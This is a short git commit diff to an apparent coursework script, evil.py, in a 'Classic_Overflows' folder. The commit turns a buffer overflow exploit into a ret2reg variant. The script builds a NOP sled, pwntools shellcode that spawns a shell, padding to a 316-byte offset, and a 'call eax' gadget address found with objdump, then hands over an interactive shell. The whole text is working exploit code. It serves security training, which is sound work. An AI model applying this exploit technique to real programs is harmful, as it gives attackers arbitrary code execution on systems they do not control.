c4926e67a1b73ee13ce96345cc5972653bc81a03
Agni <agni@kali.softwarica>
2022-01-28 09:33:02 +0545

    for ret2reg style exploit

--- Week9/Classic_Overflows/evil.py
+++ Week9/Classic_Overflows/evil.py
@@ -6,13 +6,14 @@ OFFSET = 316
 out = proc.read()
 print(out)
 pause()
-EAX_ADD = 0xffffcf80
-
+# EAX_ADD = 0xffe6ba90
+# objdump -D overflow | grep eax | grep call
+CALL_EAX = 0x8049019
 payload = b'\x90'*30
 payload += asm(shellcraft.sh())
 payload += b'\x90'*(OFFSET - len(payload))
-payload += p32(EAX_ADD)
-
+payload += p32(CALL_EAX)
+# Ret2Reg Style Exploit
 proc.writeline(payload)
 out = proc.interactive()
 # print(out)
